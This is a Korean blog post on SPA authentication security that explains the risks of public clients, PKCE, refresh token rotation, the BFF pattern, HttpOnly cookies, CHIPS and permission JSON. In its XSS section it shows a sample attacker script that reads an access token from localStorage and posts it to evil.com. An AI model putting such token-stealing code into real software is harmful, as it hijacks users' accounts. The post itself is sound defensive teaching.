---
layout: post
title: SPA 보안 아키텍처 | 토큰을 브라우저에 두지 말아야 하는 이유 🔐
description: SPA 보안 아키텍처 | 토큰을 브라우저에 두지 말아야 하는 이유
date:   2026-01-22 11:00:00 +0900
author: Jeongjin Kim
categories: Security
tags:	Security SPA
---

SPA(Single Page Application) 개발하면서 "토큰을 LocalStorage에 저장할까, 쿠키에 저장할까?" 고민해보신 적 있으신가요? 아니면 "PKCE가 뭔데 꼭 써야 하나?" 싶으셨다면, 이 글이 답입니다. 2026년 현재, 웹 보안의 가장 뜨거운 감자인 SPA 인증/인가 문제를 한 방에 정리했습니다.

---
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- 컨텐츠내 -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-3234744071843247"
     data-ad-slot="1671969273"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
---

# 왜 SPA는 보안이 어려운가?

## 신뢰 경계가 무너졌다

전통적인 웹 애플리케이션은 간단했습니다. 서버가 HTML을 렌더링하고, 브라우저는 그냥 보여주기만 하면 됐죠. 세션 정보는 서버 메모리에 안전하게 보관되고, 클라이언트는 단순한 세션 ID 쿠키만 들고 있으면 됐습니다.

그런데 SPA는 다릅니다. 비즈니스 로직이 브라우저로 넘어왔고, 상태 관리도 클라이언트에서 합니다. React나 Vue로 화려한 UI를 만들 수 있게 됐지만, 보안 관점에서는 재앙이었습니다. **브라우저라는 신뢰할 수 없는 환경에 민감한 인증 토큰을 보관해야 하는** 상황이 된 겁니다.

## 퍼블릭 클라이언트의 딜레마

OAuth 2.0 표준은 클라이언트를 두 가지로 분류합니다.

**기밀 클라이언트(Confidential Client):** 서버에서 실행되는 애플리케이션입니다. `client_secret`을 안전하게 보관할 수 있죠. 예를 들어 Node.js 백엔드나 Spring Boot 서버가 여기 해당합니다.

**퍼블릭 클라이언트(Public Client):** 사용자 디바이스에서 실행되는 애플리케이션입니다. SPA, 모바일 앱, 데스크톱 앱이 여기 속합니다. 코드가 사용자에게 노출되므로 비밀키를 가질 수 없습니다.

SPA는 JavaScript 코드가 브라우저에서 그대로 실행되므로 태생적으로 퍼블릭 클라이언트입니다. 개발자 도구만 열면 모든 코드가 보이는데, 여기에 `client_secret`을 하드코딩한다? 그건 GitHub에 비밀번호 커밋하는 것과 다를 바 없습니다.

---

# 퍼블릭 클라이언트가 직면한 위협들

## 1. 클라이언트 사칭 (Client Impersonation)

기밀 클라이언트는 `client_secret`으로 자신의 신원을 증명합니다. 하지만 퍼블릭 클라이언트는 이게 불가능합니다. 만약 실수로 SPA 코드에 `client_secret`을 포함했다면? 공격자는 개발자 도구로 이를 추출해서 정상 앱인 척 사칭할 수 있습니다.

이게 왜 문제냐면, 공격자가 사용자 데이터를 낚아채거나(피싱), 부정한 토큰을 마음대로 발급받을 수 있기 때문입니다. 그래서 IETF와 OWASP는 퍼블릭 클라이언트에서 Client Credentials Grant 방식을 **절대 사용하지 말라**고 못 박고 있습니다.

## 2. 암시적 흐름(Implicit Flow)의 몰락

과거 SPA 개발 초기에는 Implicit Flow가 인기였습니다. 인증 코드 교환 단계를 생략하고, URL 해시(`#`)에 토큰을 바로 담아 전달하는 방식이었죠.

```
https://myapp.com/callback#access_token=eyJhbG...
```

간단해 보이지만 치명적인 결함이 있었습니다:

- **토큰 유출:** URL에 포함된 토큰은 브라우저 히스토리, 프록시 로그, Referer 헤더를 통해 제3자에게 노출됩니다
- **재발급 불가:** 보안상 리프레시 토큰을 주지 않으므로, 액세스 토큰 만료 시마다 재인증이 필요합니다
- **서드파티 쿠키 차단:** iframe을 이용한 사일런트 갱신이 ITP(Intelligent Tracking Prevention) 정책으로 막혔습니다

그래서 2026년 현재, Implicit Flow는 완전히 퇴출되었습니다. OAuth 2.1 표준에서 아예 삭제됐죠.

## 3. XSS: 가장 무서운 적

퍼블릭 클라이언트의 최대 위협은 **XSS(Cross-Site Scripting)** 공격입니다. SPA는 수많은 npm 패키지와 CDN 스크립트에 의존합니다. 이 중 하나만 감염되거나 코드에 취약점이 있으면, 공격자는 악성 스크립트를 실행해서 토큰을 탈취할 수 있습니다.

```javascript
// 공격자의 악성 스크립트
const token = localStorage.getItem('access_token');
fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token })
});
```

서버 사이드 세션과 달리, JWT 같은 토큰은 그 자체로 권한을 가지고 있습니다. 탈취되는 순간 공격자는 사용자인 척 모든 API를 마음대로 호출할 수 있습니다.

---

# 해결책 1: PKCE 기반 Authorization Code Flow

별도 백엔드 없이 S3나 CDN에 정적 호스팅하는 SPA라면, 브라우저 단독으로 인증을 처리해야 합니다. 이때의 유일한 표준은 **PKCE(Proof Key for Code Exchange)**가 적용된 Authorization Code Flow입니다.

## PKCE가 뭔데?

PKCE(발음: 피씨)는 원래 모바일 앱을 위해 만들어졌지만, 지금은 모든 퍼블릭 클라이언트의 표준입니다. 핵심은 **동적 비밀**을 만들어 인증 코드를 보호하는 겁니다.

### 동작 과정

1. **Code Verifier 생성:** 클라이언트가 암호학적으로 안전한 난수를 생성합니다
   ```javascript
   const codeVerifier = generateRandomString(128);
   ```

2. **Code Challenge 도출:** Verifier를 SHA-256으로 해싱합니다
   ```javascript
   const codeChallenge = base64url(sha256(codeVerifier));
   ```

3. **인증 요청:** Challenge를 인증 서버로 보냅니다
   ```
   /authorize?code_challenge=E9M...&code_challenge_method=S256
   ```

4. **토큰 교환:** 인증 코드를 받은 후, 원본 Verifier를 함께 보냅니다
   ```
   /token?code=abc123&code_verifier=원본난수
   ```

5. **검증:** 서버가 Verifier를 해싱해서 처음 받은 Challenge와 비교합니다

### 왜 안전한가?

공격자가 리다이렉트 과정에서 인증 코드를 가로챈다고 해도 소용없습니다. 토큰으로 교환하려면 원본 `code_verifier`가 필요한데, 이건 해시의 역상 저항성 때문에 복원이 불가능합니다. **공격자는 코드를 가졌어도 토큰을 못 받는 겁니다.**

## PKCE의 한계와 리프레시 토큰 로테이션

PKCE는 인증 코드를 보호하지만, 결국 발급받은 토큰은 브라우저에 저장해야 합니다. XSS 공격 위험은 여전히 존재하죠. 이를 보완하기 위해 **리프레시 토큰 로테이션(Refresh Token Rotation)**이 필수입니다.

**작동 방식:**
- 리프레시 토큰을 일회용으로 만듭니다
- 액세스 토큰 갱신할 때마다 새 리프레시 토큰을 발급하고, 이전 토큰은 즉시 폐기합니다
- 만약 이미 사용된 토큰으로 갱신을 시도하면? 서버는 **"토큰이 탈취됐다!"**고 판단하고 해당 토큰 계열을 모두 무효화합니다

공격자뿐만 아니라 정상 사용자도 로그아웃되지만, 공격의 지속성을 차단하는 강력한 방어책입니다.

---

# 해결책 2: BFF (Backend for Frontend) 패턴

IETF와 보안 전문가들이 **강력하게 권장**하는 최상의 아키텍처입니다. 철학은 단순합니다:

**"브라우저에는 토큰을 두지 않는다(No Tokens in the Browser)"**

## BFF 아키텍처 이해하기

BFF는 SPA와 API 서버 사이에 전용 백엔드를 배치합니다. 이 백엔드는 Node.js, .NET, Java 등으로 구현된 경량 서버일 수도 있고, API 게이트웨이 플러그인일 수도 있습니다.

```
[Browser] ←→ [BFF] ←→ [Auth Server]
             ↓
         [API Server]
```

### 동작 흐름

1. **기밀 클라이언트 전환:** BFF는 서버 환경에서 동작하므로 `client_secret`을 안전하게 관리할 수 있습니다

2. **토큰의 은닉:** 사용자가 로그인하면, BFF가 인증 서버와 통신해서 토큰을 받습니다. **중요한 건 이 토큰들이 절대 브라우저로 전송되지 않는다는 겁니다.** 토큰은 BFF의 메모리, Redis, 또는 암호화된 쿠키에만 저장됩니다.

3. **세션 쿠키 발급:** BFF는 SPA에게 토큰 대신, `HttpOnly`, `Secure`, `SameSite` 속성이 적용된 세션 쿠키를 줍니다. 이 쿠키는 단순 식별자일 뿐이며, JWT payload 같은 건 없습니다.

4. **프록시 역할:** SPA가 API를 호출할 때 쿠키를 BFF로 보내면, BFF가 쿠키를 검증하고 실제 액세스 토큰을 찾아 API 요청의 `Authorization` 헤더에 주입해서 전달합니다.

## BFF의 보안적 우위

### XSS 완전 방어

브라우저에는 JavaScript가 읽을 수 없는 `HttpOnly` 쿠키만 있습니다. XSS 공격자가 악성 스크립트를 실행해도 **토큰 자체를 훔칠 수 없습니다**. 기껏해야 사용자 세션으로 요청을 보내는 정도인데, 이건 CSRF 방어로 막을 수 있습니다.

### 액세스 제어 중앙화

BFF에서 API 응답을 필터링하거나, 여러 마이크로서비스 데이터를 집계해서 프론트엔드에 전달할 수 있습니다. Over-fetching 문제도 해결되고 프론트엔드 로직도 단순해집니다.

### 복잡성 격리

토큰 갱신, 에러 처리, 로그아웃 같은 복잡한 인증 로직을 백엔드로 격리시켜서 SPA 코드를 비즈니스 로직에만 집중시킬 수 있습니다.

## 토큰 핸들러 패턴: BFF의 경량 버전

BFF 패턴의 구현체 중 하나로, 전체 API를 중계하는 대신 **보안 기능에만 특화**된 토큰 핸들러 패턴도 있습니다. Curity 같은 곳에서 제안하는 방식이죠.

**구성 요소:**
- **OAuth Agent:** 토큰 발급, 갱신, 쿠키 발행만 담당
- **OAuth Proxy:** API 게이트웨이 레벨에서 쿠키를 검증하고 토큰으로 교환

**이점:** SPA를 CDN에 정적 배포하면서도, API 게이트웨이만 활용해 BFF의 보안 이점을 누릴 수 있습니다. 별도의 BFF 서버 코드 작성 없이 인프라 설정만으로 보안을 강화할 수 있죠.

---

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- 컨텐츠내 -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-3234744071843247"
     data-ad-slot="1671969273"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
---

# LocalStorage vs Cookie: 끝나지 않는 논쟁

SPA 개발자들 사이에서 영원한 논쟁거리입니다. "토큰을 어디에 저장할까?" 이 문제는 XSS와 CSRF라는 두 공격 벡터 사이의 트레이드오프를 포함합니다.

## 비교표로 보는 장단점

| 저장 방식 | XSS 취약성 | CSRF 취약성 | 영속성 | 특징 |
|----------|-----------|------------|--------|------|
| LocalStorage / SessionStorage | 매우 높음 ⚠️ | 낮음 ✅ | 브라우저 종료 시까지 | JS로 즉시 접근 가능. XSS 시 즉시 탈취됨. **비권장** |
| 인메모리 (JS 변수) | 높음 ⚠️ | 낮음 ✅ | 페이지 리로드 시 소멸 | 디스크에 안 남지만 XSS로 메모리 덤프 가능. 새로고침마다 재로그인 |
| HttpOnly Cookie | 낮음 ✅ | 높음 ⚠️ | 만료 설정에 따름 | JS 접근 차단. XSS로 토큰 자체는 못 훔침. **권장** |

## XSS vs CSRF: 무엇이 더 위험한가?

많은 개발자가 "쿠키는 CSRF에 취약하니까 LocalStorage가 낫다"고 오해합니다. 하지만 보안 전문가들의 견해는 정반대입니다.

**XSS의 파괴력:**
- 토큰이 탈취되면 공격자는 사용자 개입 없이 언제 어디서나 API를 호출하고 계정을 탈취할 수 있습니다
- 방어가 사실상 불가능합니다

**CSRF의 방어 가능성:**
- 사용자가 브라우저를 켜고 있을 때만 공격이 가능합니다
- `SameSite` 쿠키 정책과 Anti-CSRF 토큰으로 기술적으로 완벽에 가깝게 방어할 수 있습니다

**결론:** 방어 기제가 존재하는 CSRF 위험을 감수하더라도, 방어 불가능한 토큰 탈취(XSS)를 막기 위해 `HttpOnly` 쿠키를 써야 합니다. 이게 BFF 패턴의 핵심 철학입니다.

## 브라우저의 미래: CHIPS

서드파티 쿠키 차단 정책은 iframe에 임베딩되는 SPA(채팅 위젯, 결제 모듈 등)의 인증 유지에 큰 걸림돌이었습니다. 이를 해결하기 위해 구글 등 브라우저 벤더들이 **CHIPS (Cookies Having Independent Partitioned State)** 기술을 도입했습니다.

**작동 방식:**
```javascript
Set-Cookie: session=abc123; Partitioned; Secure; SameSite=None
```

`Partitioned` 속성을 추가하면, 쿠키가 최상위 사이트별로 격리된 저장소에 저장됩니다. A 사이트에 임베딩된 내 서비스의 쿠키는 B 사이트와 공유되지 않습니다. 서드파티 추적은 막으면서도, 임베디드 앱의 정상적인 세션 유지는 가능해지는 거죠.

---

# 권한 관리: 프론트엔드와 백엔드의 동기화

인증(Authentication)이 "이 사람이 누구냐"를 확인하는 거라면, 인가(Authorization)는 "이 사람이 뭘 할 수 있냐"를 결정하는 겁니다. SPA에서는 백엔드의 권한 로직과 프론트엔드 UI 상태를 동기화해야 하는 복잡한 과제가 있습니다.

## RBAC를 넘어 Permission 중심으로

과거에는 단순히 `role: 'admin'` 같은 역할 정보를 프론트엔드에 전달했습니다. 하지만 비즈니스가 복잡해지면 한계에 봉착합니다.

예를 들어:
- "매니저는 글을 수정할 수 있다" → 간단
- "매니저는 자기 부서 글만 수정할 수 있다" → 역할 이름만으로는 표현 불가

그래서 최신 트렌드는 **구체적인 권한(Permission) 목록을 JSON으로 전달**하는 겁니다.

## 효율적인 권한 JSON 구조 (CASL 스타일)

JavaScript 진영에서 널리 쓰이는 CASL 라이브러리 호환 구조를 권장합니다:

```json
{
  "user": {
    "id": "u123",
    "roles": ["editor"],
    "permissions": [
      {
        "action": "read",
        "subject": "Article"
      },
      {
        "action": "update",
        "subject": "Article",
        "conditions": {
          "authorId": "${user.id}",
          "status": "draft"
        }
      },
      {
        "action": "delete",
        "subject": "Comment",
        "inverted": true
      }
    ]
  }
}
```

**해석:**
- 모든 Article을 읽을 수 있다(read)
- 작성자가 본인이고 상태가 draft인 Article만 수정할 수 있다(update)
- Comment는 절대 삭제할 수 없다(inverted: true → Deny 규칙)

## 동기화 전략

**핵심 원칙: "보안은 서버에서, UX는 클라이언트에서"**

1. **API가 진실의 원천(Source of Truth):** 실제 데이터 접근 제어는 반드시 API 서버에서 수행되어야 합니다. 프론트엔드 로직은 우회 가능하므로 절대 신뢰하면 안 됩니다.

2. **동기화 메커니즘:** 사용자가 로그인하거나 페이지를 로드할 때, `/api/my-permissions` 같은 엔드포인트를 호출해서 권한 JSON을 받아옵니다.

3. **UI 제어:** 받은 JSON을 Pinia(Vue)나 Context API(React) 같은 전역 상태 관리자에 저장합니다. 이후 커스텀 디렉티브나 컴포넌트로 UI를 제어합니다:

```vue
<!-- Vue 예시 -->
<button v-can="'update', post">글 수정</button>
```

```jsx
// React 예시
<Can I="create" a="Project">
  <CreateButton />
</Can>
```

권한이 없는 사용자에게는 버튼을 숨기거나 비활성화 처리합니다. 하지만 기억하세요. **이건 UX일 뿐입니다.** 진짜 보안은 백엔드에서!

---

# 결론 및 실전 권고안

2026년의 SPA 보안 환경은 이전보다 훨씬 정교한 아키텍처를 요구합니다. 브라우저의 제약은 강화되고, 공격 기법은 고도화되고 있죠.

## 핵심 요약

### 1. BFF 패턴 도입 (최우선 권장) 🏆

보안이 중요한 비즈니스 애플리케이션이라면, **토큰을 브라우저에서 완전히 제거**하는 BFF 패턴을 도입하세요. XSS로 인한 계정 탈취를 원천 봉쇄할 수 있는 현재 유일하고도 가장 강력한 아키텍처입니다.

### 2. HttpOnly 쿠키 사용

토큰 저장소로는 LocalStorage 대신 `HttpOnly`, `Secure`, `SameSite` 속성이 적용된 쿠키를 사용하세요. 스크립트 접근을 차단하여 보안성을 극대화합니다.

### 3. PKCE 및 토큰 로테이션 (차선책)

BFF 도입이 불가능한 경우(Serverless 환경 등), PKCE 기반 Authorization Code Flow를 사용하되, **반드시 리프레시 토큰 로테이션과 재사용 감지 메커니즘**을 구현하세요. 토큰 탈취 시 피해를 최소화할 수 있습니다.

### 4. 세밀한 권한 동기화

권한 관리는 단순 RBAC를 넘어, 조건(Condition)이 포함된 Permission JSON 구조로 프론트-백엔드를 동기화하세요. 단, 최종 권한 검사는 항상 백엔드 API에서!

## 미래 전망

웹 보안은 '제로 트러스트(Zero Trust)' 원칙이 클라이언트단까지 확장될 겁니다. 브라우저는 점점 더 폐쇄적인 환경으로 변모하고(서드파티 쿠키의 완전한 종말), 파티션 쿠키(CHIPS)나 Storage Access API 같은 새로운 표준 기술의 습득이 필수가 될 겁니다.

또한 **DPoP(Demonstrating Proof-of-Possession)** 같이 토큰이 특정 클라이언트에 귀속되도록 강제하는 응용 계층 보안 프로토콜도 점차 보편화될 것으로 전망됩니다.

---

# 마무리하며

SPA 보안은 단순히 "어디에 토큰을 저장할까"를 넘어선 문제입니다. 아키텍처 설계부터 보안을 내재화(Security by Design)해야 합니다.

오랜만에 SPA 프로젝트를 시작하거나, 레거시 시스템의 보안을 개선해야 한다면 이 글을 북마크해두세요. 필요할 때 다시 읽어보면 도움이 될 겁니다! 🚀

---

# 부록: 빠른 참조표

## 저장소 선택 가이드

| 상황 | 권장 방식 | 이유 |
|------|---------|------|
| 프로덕션 환경 | BFF + HttpOnly Cookie | XSS 완전 방어 |
| Serverless SPA | PKCE + 토큰 로테이션 | 백엔드 구축 불가 시 차선책 |
| 개발/테스트 환경 | LocalStorage (임시) | 편의성, 단 프로덕션 전 교체 필수 |
| 임베디드 위젯 | CHIPS 활용 | 서드파티 쿠키 차단 우회 |



<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- 컨텐츠내 -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-3234744071843247"
     data-ad-slot="1671969273"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>